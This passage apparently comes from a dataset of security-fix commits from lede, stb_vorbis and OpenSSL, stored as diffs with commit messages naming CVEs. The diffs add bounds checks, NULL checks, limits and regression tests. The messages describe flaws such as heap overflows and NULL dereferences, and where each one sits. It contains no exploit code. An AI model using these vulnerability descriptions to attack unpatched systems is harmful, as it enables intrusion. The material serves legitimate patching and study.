    \ Olliver Schinagl <oliver@schinagl.nl>\r\nCo-authored-by: Michael Pratt <mcpratt@pm.me>\r\
    \nCo-authored-by: Stijn Tintel <stijn@linux-ipv6.be>\r\nCo-authored-by: Andre\
    \ Heider <a.heider@gmail.com>\r\nCo-authored-by: Kien Truong <duckientruong@gmail.com>\r\
    \nCo-authored-by: Nick Hainke <vincent@systemli.org>\r\nCo-authored-by: Hauke\
    \ Mehrtens <hauke@hauke-m.de>"
  commit_sha: d2460dfb82ae1ee2a41a20bfe479f216056c2dcc
  repo_name: coolsnowwolf/lede
- commit_diff:
  - "--- a/target/linux/ath79/files/drivers/net/ethernet/atheros/ag71xx/ag71xx_main.c\n\
    +++ b/target/linux/ath79/files/drivers/net/ethernet/atheros/ag71xx/ag71xx_main.c\n\
    @@ -1214,14 +1214,22 @@ static int ag71xx_rx_packets(struct ag71xx *ag, int limit)\n\
    \ \tunsigned int offset = ag->rx_buf_offset;\n \tint ring_mask = BIT(ring->order)\
    \ - 1;\n \tint ring_size = BIT(ring->order);\n+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4,19,0))\n\
    +\tstruct list_head rx_list;\n+\tstruct sk_buff *next;\n+#else\n \tstruct sk_buff_head\
    \ queue;\n+#endif\n \tstruct sk_buff *skb;\n \tint done = 0;\n \n \tDBG(\"%s:\
    \ rx packets, limit=%d, curr=%u, dirty=%u\\n\",\n \t\t\tdev->name, limit, ring->curr,\
    \ ring->dirty);\n-\n+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4,19,0))\n+\tINIT_LIST_HEAD(&rx_list);\n\
    +#else\n \tskb_queue_head_init(&queue);\n+#endif\n \n \twhile (done < limit) {\n\
    \ \t\tunsigned int i = ring->curr & ring_mask;\n@@ -1263,7 +1271,11 @@ static\
    \ int ag71xx_rx_packets(struct ag71xx *ag, int limit)\n \t\t} else {\n \t\t\t\
    skb->dev = dev;\n \t\t\tskb->ip_summed = CHECKSUM_NONE;\n+#if (LINUX_VERSION_CODE\
    \ >= KERNEL_VERSION(4,19,0))\n+\t\t\tlist_add_tail(&skb->list, &rx_list);\n+#else\n\
    \ \t\t\t__skb_queue_tail(&queue, skb);\n+#endif\n \t\t}\n \n next:\n@@ -1275,10\
    \ +1287,16 @@ static int ag71xx_rx_packets(struct ag71xx *ag, int limit)\n \n\
    \ \tag71xx_ring_rx_refill(ag);\n \n+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4,19,0))\n\
    +\tlist_for_each_entry_safe(skb, next, &rx_list, list)\n+\t\tskb->protocol = eth_type_trans(skb,\
    \ dev);\n+\tnetif_receive_skb_list(&rx_list);\n+#else\n \twhile ((skb = __skb_dequeue(&queue))\
    \ != NULL) {\n \t\tskb->protocol = eth_type_trans(skb, dev);\n \t\tnetif_receive_skb(skb);\n\
    \ \t}\n+#endif\n \n \tDBG(\"%s: rx finish, curr=%u, dirty=%u, done=%d\\n\",\n\
    \ \t\tdev->name, ring->curr, ring->dirty, done);"
  commit_message: "kernel: bump to 4.9.214, 4.14.171, 4.19.106 (#3318)\n\n* kernel:\
    \ bump 4.14 to 4.14.171\r\n\r\nRefreshed all patches.\r\n\r\nFixes:\r\n- CVE-2013-1798\r\
    \n\r\nCompile-tested on: cns3xxx\r\nRuntime-tested on: cns3xxx\r\n\r\nSigned-off-by:\
    \ Koen Vandeputte <koen.vandeputte@ncentric.com>\r\n\r\n* kernel: bump 4.19 to\
    \ 4.19.105\r\n\r\nRefreshed all patches.\r\n\r\nFixes:\r\n- CVE-2013-1798\r\n\
    - CVE-2019-3016\r\n\r\nCompile-tested on: cns3xxx\r\nRuntime-tested on: cns3xxx\r\
    \n\r\nSigned-off-by: Koen Vandeputte <koen.vandeputte@ncentric.com>\r\n\r\n* kernel:\
    \ bump 4.19 to 4.19.106\r\n\r\nRefreshed all patches.\r\n\r\nRemove upstreamed:\r\
    \n- 950-0786-leds-pca963x-Fix-open-drain-initialization.patch\r\n\r\nCompile-tested\
    \ on: cns3xxx\r\nRuntime-tested on: cns3xxx\r\n\r\nSigned-off-by: Koen Vandeputte\
    \ <koen.vandeputte@ncentric.com>\r\n\r\n* kernel: bump to 4.9.214, 4.14.171, 4.19.106\r\
    \n\r\nCo-authored-by: Koen Vandeputte <koen.vandeputte@ncentric.com>"
  commit_sha: 01ab5cf3c9bb13d7fcd5884ada8670fa427a069c
  repo_name: coolsnowwolf/lede
- commit_diff:
  - "--- a/stb_vorbis.c\n+++ b/stb_vorbis.c\n@@ -5396,7 +5396,7 @@ int stb_vorbis_get_samples_float(stb_vorbis\
    \ *f, int channels, float **buffer, in\n #endif // STB_VORBIS_NO_PULLDATA_API\n\
    \ \n /* Version history\n-    1.17    - 2019-07-08 - fix CVE-2019-13217, -13218,\
    \ -13219, -13220, -13221, -13223, -13223\n+    1.17    - 2019-07-08 - fix CVE-2019-13217,\
    \ -13218, -13219, -13220, -13221, -13222, -13223\n                           \
    \ found with Mayhem by ForAllSecure\n     1.16    - 2019-03-04 - fix warnings\n\
    \     1.15    - 2019-02-07 - explicit failure if Ogg Skeleton data is found"
  commit_message: 'stb_vorbis: fix typo in CVE number in docs'
  commit_sha: 5c98e6564ba74d5a6e97004dd8730a69e9e7b6e6
  repo_name: nothings/stb
- commit_diff:
  - "--- a/stb_vorbis.c\n+++ b/stb_vorbis.c\n@@ -33,6 +33,7 @@\n //    Timur Gagiev\n\
    \ //\n // Partial history:\n+//    1.17    - 2019-07-08 - fix CVE-2019-13217..CVE-2019-13223\
    \ (by ForAllSecure)\n //    1.16    - 2019-03-04 - fix warnings\n //    1.15 \
    \   - 2019-02-07 - explicit failure if Ogg Skeleton data is found\n //    1.14\
    \    - 2018-02-11 - delete bogus dealloca usage\n@@ -1202,8 +1203,10 @@ static\
    \ int lookup1_values(int entries, int dim)\n    int r = (int) floor(exp((float)\
    \ log((float) entries) / dim));\n    if ((int) floor(pow((float) r+1, dim)) <=\
    \ entries)   // (int) cast for MinGW warning;\n       ++r;                   \
    \                           // floor() to avoid _ftol() when non-CRT\n-   assert(pow((float)\
    \ r+1, dim) > entries);\n-   assert((int) floor(pow((float) r, dim)) <= entries);\
    \ // (int),floor() as above\n+   if (pow((float) r+1, dim) <= entries)\n+    \
    \  return -1;\n+   if ((int) floor(pow((float) r, dim)) > entries)\n+      return\
    \ -1;\n    return r;\n }\n \n@@ -2013,15 +2016,15 @@ static __forceinline void\
    \ draw_line(float *output, int x0, int y0, int x1, int y\n    ady -= abs(base)\
    \ * adx;\n    if (x1 > n) x1 = n;\n    if (x < x1) {\n-      LINE_OP(output[x],\
    \ inverse_db_table[y]);\n+      LINE_OP(output[x], inverse_db_table[y&255]);\n\
    \       for (++x; x < x1; ++x) {\n          err += ady;\n          if (err >=\
    \ adx) {\n             err -= adx;\n             y += sy;\n          } else\n\
    \             y += base;\n-         LINE_OP(output[x], inverse_db_table[y]);\n\
    +         LINE_OP(output[x], inverse_db_table[y&255]);\n       }\n    }\n }\n\
    @@ -3048,7 +3051,6 @@ static float *get_window(vorb *f, int len)\n    len <<=\
    \ 1;\n    if (len == f->blocksize_0) return f->window[0];\n    if (len == f->blocksize_1)\
    \ return f->window[1];\n-   assert(0);\n    return NULL;\n }\n \n@@ -3454,6 +3456,7\
    \ @@ static int vorbis_finish_frame(stb_vorbis *f, int len, int left, int right)\n\
    \    if (f->previous_length) {\n       int i,j, n = f->previous_length;\n    \
    \   float *w = get_window(f, n);\n+      if (w == NULL) return 0;\n       for\
    \ (i=0; i < f->channels; ++i) {\n          for (j=0; j < n; ++j)\n           \
    \  f->channel_buffers[i][left+j] =\n@@ -3695,6 +3698,7 @@ static int start_decoder(vorb\
    \ *f)\n          while (current_entry < c->entries) {\n             int limit\
    \ = c->entries - current_entry;\n             int n = get_bits(f, ilog(limit));\n\
    +            if (current_length >= 32) return error(f, VORBIS_invalid_setup);\n\
    \             if (current_entry + n > (int) c->entries) { return error(f, VORBIS_invalid_setup);\
    \ }\n             memset(lengths + current_entry, current_length, n);\n      \
    \       current_entry += n;\n@@ -3798,7 +3802,9 @@ static int start_decoder(vorb\
    \ *f)\n          c->value_bits = get_bits(f, 4)+1;\n          c->sequence_p =\
    \ get_bits(f,1);\n          if (c->lookup_type == 1) {\n-            c->lookup_values\
    \ = lookup1_values(c->entries, c->dimensions);\n+            int values = lookup1_values(c->entries,\
    \ c->dimensions);\n+            if (values < 0) return error(f, VORBIS_invalid_setup);\n\
    +            c->lookup_values = (uint32) values;\n          } else {\n       \
    \      c->lookup_values = c->entries * c->dimensions;\n          }\n@@ -3934,6\
    \ +3940,9 @@ static int start_decoder(vorb *f)\n             p[j].id = j;\n  \
    \        }\n          qsort(p, g->values, sizeof(p[0]), point_compare);\n+   \
    \      for (j=0; j < g->values-1; ++j)\n+            if (p[j].x == p[j+1].x)\n\
    +               return error(f, VORBIS_invalid_setup);\n          for (j=0; j\
    \ < g->values; ++j)\n             g->sorted_order[j] = (uint8) p[j].id;\n    \
    \      // precompute the neighbors\n@@ -4020,6 +4029,7 @@ static int start_decoder(vorb\
    \ *f)\n          max_submaps = m->submaps;\n       if (get_bits(f,1)) {\n    \
    \      m->coupling_steps = get_bits(f,8)+1;\n+         if (m->coupling_steps >\
    \ f->channels) return error(f, VORBIS_invalid_setup);\n          for (k=0; k <\
    \ m->coupling_steps; ++k) {\n             m->chan[k].magnitude = get_bits(f, ilog(f->channels-1));\n\
    \             m->chan[k].angle = get_bits(f, ilog(f->channels-1));\n@@ -5386,6\
    \ +5396,12 @@ int stb_vorbis_get_samples_float(stb_vorbis *f, int channels, float\
    \ **buffer, in\n #endif // STB_VORBIS_NO_PULLDATA_API\n \n /* Version history\n\
    +    1.17    - 2019-07-08 - fix CVE-2019-13217, -13218, -13219, -13220, -13221,\
    \ -13223, -13223\n+                           found with Mayhem by ForAllSecure\n\
    +    1.16    - 2019-03-04 - fix warnings\n+    1.15    - 2019-02-07 - explicit\
    \ failure if Ogg Skeleton data is found\n+    1.14    - 2018-02-11 - delete bogus\
    \ dealloca usage\n+    1.13    - 2018-01-29 - fix truncation of last frame (hopefully)\n\
    \     1.12    - 2017-11-21 - limit residue begin/end to blocksize/2 to avoid large\
    \ temp allocs in bad/corrupt files\n     1.11    - 2017-07-23 - fix MinGW compilation\
    \ \n     1.10    - 2017-03-03 - more robust seeking; fix negative ilog(); clear\
    \ error in open_memory"
  commit_message: 'Fix seven bugs discovered and fixed by ForAllSecure:


    CVE-2019-13217: heap buffer overflow in start_decoder()

    CVE-2019-13218: stack buffer overflow in compute_codewords()

    CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest()

    CVE-2019-13220: out-of-range read in draw_line()

    CVE-2019-13221: issue with large 1D codebooks in lookup1_values()

    CVE-2019-13222: unchecked NULL returned by get_window()

    CVE-2019-13223: division by zero in predict_point()'
  commit_sha: 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
  repo_name: nothings/stb
- commit_diff:
  - "--- a/crypto/pkcs12/p12_add.c\n+++ b/crypto/pkcs12/p12_add.c\n@@ -78,6 +78,12\
    \ @@ STACK_OF(PKCS12_SAFEBAG) *PKCS12_unpack_p7data(PKCS7 *p7)\n         ERR_raise(ERR_LIB_PKCS12,\
    \ PKCS12_R_CONTENT_TYPE_NOT_DATA);\n         return NULL;\n     }\n+\n+    if\
    \ (p7->d.data == NULL) {\n+        ERR_raise(ERR_LIB_PKCS12, PKCS12_R_DECODE_ERROR);\n\
    +        return NULL;\n+    }\n+\n     return ASN1_item_unpack_ex(p7->d.data,\
    \ ASN1_ITEM_rptr(PKCS12_SAFEBAGS),\n                                ossl_pkcs7_ctx_get0_libctx(&p7->ctx),\n\
    \                                ossl_pkcs7_ctx_get0_propq(&p7->ctx));\n@@ -152,6\
    \ +158,12 @@ STACK_OF(PKCS12_SAFEBAG) *PKCS12_unpack_p7encdata(PKCS7 *p7, const\
    \ char *pass,\n {\n     if (!PKCS7_type_is_encrypted(p7))\n         return NULL;\n\
    +\n+    if (p7->d.encrypted == NULL) {\n+        ERR_raise(ERR_LIB_PKCS12, PKCS12_R_DECODE_ERROR);\n\
    +        return NULL;\n+    }\n+\n     return PKCS12_item_decrypt_d2i_ex(p7->d.encrypted->enc_data->algorithm,\n\
    \                                    ASN1_ITEM_rptr(PKCS12_SAFEBAGS),\n      \
    \                              pass, passlen,\n@@ -191,6 +203,12 @@ STACK_OF(PKCS7)\
    \ *PKCS12_unpack_authsafes(const PKCS12 *p12)\n         ERR_raise(ERR_LIB_PKCS12,\
    \ PKCS12_R_CONTENT_TYPE_NOT_DATA);\n         return NULL;\n     }\n+\n+    if\
    \ (p12->authsafes->d.data == NULL) {\n+        ERR_raise(ERR_LIB_PKCS12, PKCS12_R_DECODE_ERROR);\n\
    +        return NULL;\n+    }\n+\n     p7ctx = &p12->authsafes->ctx;\n     p7s\
    \ = ASN1_item_unpack_ex(p12->authsafes->d.data,\n                            \
    \   ASN1_ITEM_rptr(PKCS12_AUTHSAFES),"
  - "--- a/crypto/pkcs12/p12_mutl.c\n+++ b/crypto/pkcs12/p12_mutl.c\n@@ -98,6 +98,11\
    \ @@ static int pkcs12_gen_mac(PKCS12 *p12, const char *pass, int passlen,\n \
    \        return 0;\n     }\n \n+    if (p12->authsafes->d.data == NULL) {\n+ \
    \       ERR_raise(ERR_LIB_PKCS12, PKCS12_R_DECODE_ERROR);\n+        return 0;\n\
    +    }\n+\n     salt = p12->mac->salt->data;\n     saltlen = p12->mac->salt->length;\n\
    \     if (p12->mac->iter == NULL)"
  - "--- a/crypto/pkcs12/p12_npas.c\n+++ b/crypto/pkcs12/p12_npas.c\n@@ -80,8 +80,9\
    \ @@ static int newpass_p12(PKCS12 *p12, const char *oldpass, const char *newpass)\n\
    \             bags = PKCS12_unpack_p7data(p7);\n         } else if (bagnid ==\
    \ NID_pkcs7_encrypted) {\n             bags = PKCS12_unpack_p7encdata(p7, oldpass,\
    \ -1);\n-            if (!alg_get(p7->d.encrypted->enc_data->algorithm,\n-   \
    \                      &pbe_nid, &pbe_iter, &pbe_saltlen, &cipherid))\n+     \
    \       if (p7->d.encrypted == NULL\n+                    || !alg_get(p7->d.encrypted->enc_data->algorithm,\n\
    +                                &pbe_nid, &pbe_iter, &pbe_saltlen, &cipherid))\n\
    \                 goto err;\n         } else {\n             continue;"
  - "--- a/crypto/pkcs7/pk7_mime.c\n+++ b/crypto/pkcs7/pk7_mime.c\n@@ -33,10 +33,13\
    \ @@ int SMIME_write_PKCS7(BIO *bio, PKCS7 *p7, BIO *data, int flags)\n     int\
    \ ctype_nid = OBJ_obj2nid(p7->type);\n     const PKCS7_CTX *ctx = ossl_pkcs7_get0_ctx(p7);\n\
    \ \n-    if (ctype_nid == NID_pkcs7_signed)\n+    if (ctype_nid == NID_pkcs7_signed)\
    \ {\n+        if (p7->d.sign == NULL)\n+            return 0;\n         mdalgs\
    \ = p7->d.sign->md_algs;\n-    else\n+    } else {\n         mdalgs = NULL;\n\
    +    }\n \n     flags ^= SMIME_OLDMIME;\n "
  commit_message: 'Add NULL checks where ContentInfo data can be NULL


    PKCS12 structures contain PKCS7 ContentInfo fields. These fields are

    optional and can be NULL even if the "type" is a valid value. OpenSSL

    was not properly accounting for this and a NULL dereference can occur

    causing a crash.


    CVE-2024-0727


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Neil Horman <nhorman@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/23361)'
  commit_sha: 041962b429ebe748c8b6b7922980dfb6decfef26
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/rsa/rsa_sp800_56b_check.c\n+++ b/crypto/rsa/rsa_sp800_56b_check.c\n\
    @@ -289,6 +289,11 @@ int ossl_rsa_sp800_56b_check_public(const RSA *rsa)\n   \
    \      return 0;\n \n     nbits = BN_num_bits(rsa->n);\n+    if (nbits > OPENSSL_RSA_MAX_MODULUS_BITS)\
    \ {\n+        ERR_raise(ERR_LIB_RSA, RSA_R_MODULUS_TOO_LARGE);\n+        return\
    \ 0;\n+    }\n+\n #ifdef FIPS_MODULE\n     /*\n      * (Step a): modulus must\
    \ be 2048 or 3072 (caveat from SP800-56Br1)\n@@ -324,7 +329,8 @@ int ossl_rsa_sp800_56b_check_public(const\
    \ RSA *rsa)\n         goto err;\n     }\n \n-    ret = ossl_bn_miller_rabin_is_prime(rsa->n,\
    \ 0, ctx, NULL, 1, &status);\n+    /* Highest number of MR rounds from FIPS 186-5\
    \ Section B.3 Table B.1 */\n+    ret = ossl_bn_miller_rabin_is_prime(rsa->n, 5,\
    \ ctx, NULL, 1, &status);\n #ifdef FIPS_MODULE\n     if (ret != 1 || status !=\
    \ BN_PRIMETEST_COMPOSITE_NOT_POWER_OF_PRIME) {\n #else"
  commit_message: 'Limit the execution time of RSA public key check


    Fixes CVE-2023-6237


    If a large and incorrect RSA public key is checked with

    EVP_PKEY_public_check() the computation could take very long time

    due to no limit being applied to the RSA public key size and

    unnecessarily high number of Miller-Rabin algorithm rounds

    used for non-primality check of the modulus.


    Now the keys larger than 16384 bits (OPENSSL_RSA_MAX_MODULUS_BITS)

    will fail the check with RSA_R_MODULUS_TOO_LARGE error reason.

    Also the number of Miller-Rabin rounds was set to 5.


    Reviewed-by: Neil Horman <nhorman@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/23243)'
  commit_sha: e09fc1d746a4fd15bb5c3d7bbbab950aadd005db
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/apps/errstr.c\n+++ b/apps/errstr.c\n@@ -62,7 +62,7 @@ int errstr_main(int\
    \ argc, char **argv)\n     /* All remaining arg are error code. */\n     ret =\
    \ 0;\n     for (argv = opt_rest(); *argv != NULL; argv++) {\n-        if (sscanf(*argv,\
    \ \"%lx\", &l) == 0) {\n+        if (sscanf(*argv, \"%lx\", &l) <= 0) {\n    \
    \         ret++;\n         } else {\n             ERR_error_string_n(l, buf, sizeof(buf));"
  - "--- a/crypto/http/http_lib.c\n+++ b/crypto/http/http_lib.c\n@@ -118,7 +118,7\
    \ @@ int OSSL_parse_url(const char *url, char **pscheme, char **puser, char **phost,\n\
    \         port = ++p;\n     /* remaining port spec handling is also done for the\
    \ default values */\n     /* make sure a decimal port number is given */\n-  \
    \  if (!sscanf(port, \"%u\", &portnum) || portnum > 65535) {\n+    if (sscanf(port,\
    \ \"%u\", &portnum) <= 0 || portnum > 65535) {\n         ERR_raise_data(ERR_LIB_HTTP,\
    \ HTTP_R_INVALID_PORT_NUMBER, \"%s\", port);\n         goto err;\n     }"
  commit_message: 'Fix some invalid use of sscanf


    sscanf can return -1 on an empty input string. We need to appropriately

    handle such an invalid case.


    The instance in OSSL_HTTP_parse_url could cause an uninitialised read of

    sizeof(unsigned int) bytes (typically 4). In many cases this uninit read

    will immediately fail on the following check (i.e. if the read value

    >65535).


    If the top 2 bytes of a 4 byte unsigned int are zero then the value will

    be <=65535 and the uninitialised value will be returned to the caller and

    could represent arbitrary data on the application stack.


    The OpenSSL security team has assessed this issue and consider it to be

    a bug only (i.e. not a CVE).


    Reviewed-by: Todd Short <todd.short@me.com>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Shane Lontis <shane.lontis@oracle.com>

    (Merged from https://github.com/openssl/openssl/pull/22961)'
  commit_sha: 322517d817ecb5c1a3a8b0e7e038fa146857b4d4
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/test/evp_extra_test.c\n+++ b/test/evp_extra_test.c\n@@ -5051,6 +5051,253\
    \ @@ static int test_sign_continuation(void)\n     return testresult;\n }\n \n\
    +static int aes_gcm_encrypt(const unsigned char *gcm_key, size_t gcm_key_s,\n\
    +                           const unsigned char *gcm_iv, size_t gcm_ivlen,\n+\
    \                           const unsigned char *gcm_pt, size_t gcm_pt_s,\n+ \
    \                          const unsigned char *gcm_aad, size_t gcm_aad_s,\n+\
    \                           const unsigned char *gcm_ct, size_t gcm_ct_s,\n+ \
    \                          const unsigned char *gcm_tag, size_t gcm_tag_s)\n+{\n\
    +    int ret = 0;\n+    EVP_CIPHER_CTX *ctx;\n+    EVP_CIPHER *cipher = NULL;\n\
    +    int outlen, tmplen;\n+    unsigned char outbuf[1024];\n+    unsigned char\
    \ outtag[16];\n+    OSSL_PARAM params[2] = {\n+        OSSL_PARAM_END, OSSL_PARAM_END\n\
    +    };\n+\n+    if (!TEST_ptr(ctx = EVP_CIPHER_CTX_new())\n+            || !TEST_ptr(cipher\
    \ = EVP_CIPHER_fetch(testctx, \"AES-256-GCM\", \"\")))\n+        goto err;\n+\n\
    +    params[0] = OSSL_PARAM_construct_size_t(OSSL_CIPHER_PARAM_AEAD_IVLEN,\n+\
    \                                            &gcm_ivlen);\n+\n+    if (!TEST_true(EVP_EncryptInit_ex2(ctx,\
    \ cipher, gcm_key, gcm_iv, params))\n+            || (gcm_aad != NULL\n+     \
    \           && !TEST_true(EVP_EncryptUpdate(ctx, NULL, &outlen,\n+           \
    \                                     gcm_aad, gcm_aad_s)))\n+            || !TEST_true(EVP_EncryptUpdate(ctx,\
    \ outbuf, &outlen,\n+                                            gcm_pt, gcm_pt_s))\n\
    +            || !TEST_true(EVP_EncryptFinal_ex(ctx, outbuf, &tmplen)))\n+    \
    \    goto err;\n+\n+    params[0] = OSSL_PARAM_construct_octet_string(OSSL_CIPHER_PARAM_AEAD_TAG,\n\
    +                                                  outtag, sizeof(outtag));\n\
    +\n+    if (!TEST_true(EVP_CIPHER_CTX_get_params(ctx, params))\n+            ||\
    \ !TEST_mem_eq(outbuf, outlen, gcm_ct, gcm_ct_s)\n+            || !TEST_mem_eq(outtag,\
    \ gcm_tag_s, gcm_tag, gcm_tag_s))\n+        goto err;\n+\n+    ret = 1;\n+err:\n\
    +    EVP_CIPHER_free(cipher);\n+    EVP_CIPHER_CTX_free(ctx);\n+\n+    return\
    \ ret;\n+}\n+\n+static int aes_gcm_decrypt(const unsigned char *gcm_key, size_t\
    \ gcm_key_s,\n+                           const unsigned char *gcm_iv, size_t\
    \ gcm_ivlen,\n+                           const unsigned char *gcm_pt, size_t\
    \ gcm_pt_s,\n+                           const unsigned char *gcm_aad, size_t\
    \ gcm_aad_s,\n+                           const unsigned char *gcm_ct, size_t\
    \ gcm_ct_s,\n+                           const unsigned char *gcm_tag, size_t\
    \ gcm_tag_s)\n+{\n+    int ret = 0;\n+    EVP_CIPHER_CTX *ctx;\n+    EVP_CIPHER\
    \ *cipher = NULL;\n+    int outlen;\n+    unsigned char outbuf[1024];\n+    OSSL_PARAM\
    \ params[2] = {\n+        OSSL_PARAM_END, OSSL_PARAM_END\n+    };\n+\n+    if\
    \ ((ctx = EVP_CIPHER_CTX_new()) == NULL)\n+        goto err;\n+\n+    if ((cipher\
    \ = EVP_CIPHER_fetch(testctx, \"AES-256-GCM\", \"\")) == NULL)\n+        goto\
    \ err;\n+\n+    params[0] = OSSL_PARAM_construct_size_t(OSSL_CIPHER_PARAM_AEAD_IVLEN,\n\
    +                                            &gcm_ivlen);\n+\n+    if (!TEST_true(EVP_DecryptInit_ex2(ctx,\
    \ cipher, gcm_key, gcm_iv, params))\n+            || (gcm_aad != NULL\n+     \
    \           && !TEST_true(EVP_DecryptUpdate(ctx, NULL, &outlen,\n+           \
    \                                     gcm_aad, gcm_aad_s)))\n+            || !TEST_true(EVP_DecryptUpdate(ctx,\
    \ outbuf, &outlen,\n+                                            gcm_ct, gcm_ct_s))\n\
    +            || !TEST_mem_eq(outbuf, outlen, gcm_pt, gcm_pt_s))\n+        goto\
    \ err;\n+\n+    params[0] = OSSL_PARAM_construct_octet_string(OSSL_CIPHER_PARAM_AEAD_TAG,\n\
    +                                                  (void*)gcm_tag, gcm_tag_s);\n\
    +\n+    if (!TEST_true(EVP_CIPHER_CTX_set_params(ctx, params))\n+            ||!TEST_true(EVP_DecryptFinal_ex(ctx,\
    \ outbuf, &outlen)))\n+        goto err;\n+\n+    ret = 1;\n+err:\n+    EVP_CIPHER_free(cipher);\n\
    +    EVP_CIPHER_CTX_free(ctx);\n+\n+    return ret;\n+}\n+\n+static int test_aes_gcm_ivlen_change_cve_2023_5363(void)\n\
    +{\n+    /* AES-GCM test data obtained from NIST public test vectors */\n+   \
    \ static const unsigned char gcm_key[] = {\n+        0xd0, 0xc2, 0x67, 0xc1, 0x9f,\
    \ 0x30, 0xd8, 0x0b, 0x89, 0x14, 0xbb, 0xbf,\n+        0xb7, 0x2f, 0x73, 0xb8,\
    \ 0xd3, 0xcd, 0x5f, 0x6a, 0x78, 0x70, 0x15, 0x84,\n+        0x8a, 0x7b, 0x30,\
    \ 0xe3, 0x8f, 0x16, 0xf1, 0x8b,\n+    };\n+    static const unsigned char gcm_iv[]\
    \ = {\n+        0xb6, 0xdc, 0xda, 0x95, 0xac, 0x99, 0x77, 0x76, 0x25, 0xae, 0x87,\
    \ 0xf8,\n+        0xa3, 0xa9, 0xdd, 0x64, 0xd7, 0x9b, 0xbd, 0x5f, 0x4a, 0x0e,\
    \ 0x54, 0xca,\n+        0x1a, 0x9f, 0xa2, 0xe3, 0xf4, 0x5f, 0x5f, 0xc2, 0xce,\
    \ 0xa7, 0xb6, 0x14,\n+        0x12, 0x6f, 0xf0, 0xaf, 0xfd, 0x3e, 0x17, 0x35,\
    \ 0x6e, 0xa0, 0x16, 0x09,\n+        0xdd, 0xa1, 0x3f, 0xd8, 0xdd, 0xf3, 0xdf,\
    \ 0x4f, 0xcb, 0x18, 0x49, 0xb8,\n+        0xb3, 0x69, 0x2c, 0x5d, 0x4f, 0xad,\
    \ 0x30, 0x91, 0x08, 0xbc, 0xbe, 0x24,\n+        0x01, 0x0f, 0xbe, 0x9c, 0xfb,\
    \ 0x4f, 0x5d, 0x19, 0x7f, 0x4c, 0x53, 0xb0,\n+        0x95, 0x90, 0xac, 0x7b,\
    \ 0x1f, 0x7b, 0xa0, 0x99, 0xe1, 0xf3, 0x48, 0x54,\n+        0xd0, 0xfc, 0xa9,\
    \ 0xcc, 0x91, 0xf8, 0x1f, 0x9b, 0x6c, 0x9a, 0xe0, 0xdc,\n+        0x63, 0xea,\
    \ 0x7d, 0x2a, 0x4a, 0x7d, 0xa5, 0xed, 0x68, 0x57, 0x27, 0x6b,\n+        0x68,\
    \ 0xe0, 0xf2, 0xb8, 0x51, 0x50, 0x8d, 0x3d,\n+    };\n+    static const unsigned\
    \ char gcm_pt[] = {\n+        0xb8, 0xb6, 0x88, 0x36, 0x44, 0xe2, 0x34, 0xdf,\
    \ 0x24, 0x32, 0x91, 0x07,\n+        0x4f, 0xe3, 0x6f, 0x81,\n+    };\n+    static\
    \ const unsigned char gcm_ct[] = {\n+        0xff, 0x4f, 0xb3, 0xf3, 0xf9, 0xa2,\
    \ 0x51, 0xd4, 0x82, 0xc2, 0xbe, 0xf3,\n+        0xe2, 0xd0, 0xec, 0xed,\n+   \
    \ };\n+    static const unsigned char gcm_tag[] = {\n+        0xbd, 0x06, 0x38,\
    \ 0x09, 0xf7, 0xe1, 0xc4, 0x72, 0x0e, 0xf2, 0xea, 0x63,\n+        0xdb, 0x99,\
    \ 0x6c, 0x21,\n+    };\n+\n+    return aes_gcm_encrypt(gcm_key, sizeof(gcm_key),\
    \ gcm_iv, sizeof(gcm_iv),\n+                           gcm_pt, sizeof(gcm_pt),\
    \ NULL, 0,\n+                           gcm_ct, sizeof(gcm_ct), gcm_tag, sizeof(gcm_tag))\n\
    +        && aes_gcm_decrypt(gcm_key, sizeof(gcm_key), gcm_iv, sizeof(gcm_iv),\n\
    +                           gcm_pt, sizeof(gcm_pt), NULL, 0,\n+              \
    \             gcm_ct, sizeof(gcm_ct), gcm_tag, sizeof(gcm_tag));\n+}\n+\n+#ifndef\
    \ OPENSSL_NO_RC4\n+static int rc4_encrypt(const unsigned char *rc4_key, size_t\
    \ rc4_key_s,\n+                       const unsigned char *rc4_pt, size_t rc4_pt_s,\n\
    +                       const unsigned char *rc4_ct, size_t rc4_ct_s)\n+{\n+ \
    \   int ret = 0;\n+    EVP_CIPHER_CTX *ctx;\n+    EVP_CIPHER *cipher = NULL;\n\
    +    int outlen, tmplen;\n+    unsigned char outbuf[1024];\n+    OSSL_PARAM params[2]\
    \ = {\n+        OSSL_PARAM_END, OSSL_PARAM_END\n+    };\n+\n+    if (!TEST_ptr(ctx\
    \ = EVP_CIPHER_CTX_new())\n+            || !TEST_ptr(cipher = EVP_CIPHER_fetch(testctx,\
    \ \"RC4\", \"\")))\n+        goto err;\n+\n+    params[0] = OSSL_PARAM_construct_size_t(OSSL_CIPHER_PARAM_KEYLEN,\n\
    +                                            &rc4_key_s);\n+\n+    if (!TEST_true(EVP_EncryptInit_ex2(ctx,\
    \ cipher, rc4_key, NULL, params))\n+            || !TEST_true(EVP_EncryptUpdate(ctx,\
    \ outbuf, &outlen,\n+                                            rc4_pt, rc4_pt_s))\n\
    +            || !TEST_true(EVP_EncryptFinal_ex(ctx, outbuf, &tmplen)))\n+    \
    \    goto err;\n+\n+    if (!TEST_mem_eq(outbuf, outlen, rc4_ct, rc4_ct_s))\n\
    +        goto err;\n+\n+    ret = 1;\n+err:\n+    EVP_CIPHER_free(cipher);\n+\
    \    EVP_CIPHER_CTX_free(ctx);\n+\n+    return ret;\n+}\n+\n+static int rc4_decrypt(const\
    \ unsigned char *rc4_key, size_t rc4_key_s,\n+                       const unsigned\
    \ char *rc4_pt, size_t rc4_pt_s,\n+                       const unsigned char\
    \ *rc4_ct, size_t rc4_ct_s)\n+{\n+    int ret = 0;\n+    EVP_CIPHER_CTX *ctx;\n\
    +    EVP_CIPHER *cipher = NULL;\n+    int outlen;\n+    unsigned char outbuf[1024];\n\
